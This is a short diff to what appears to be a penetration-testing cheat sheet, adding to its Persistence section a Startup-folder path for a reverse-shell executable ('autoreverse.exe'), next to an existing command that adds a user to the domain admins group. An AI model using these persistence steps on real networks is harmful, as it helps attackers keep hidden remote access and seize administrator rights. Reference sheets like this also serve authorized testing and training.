@@ -1073,6 +1073,11 @@ kerberos::ptt file.kirbi
 ```
 #### Persistence
 
+Reverse Shell with startup
+```
+%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\autoreverse.exe
+```
+
 Create a domain admin user
 ```
 net group "domain adminis" USER /add /domain
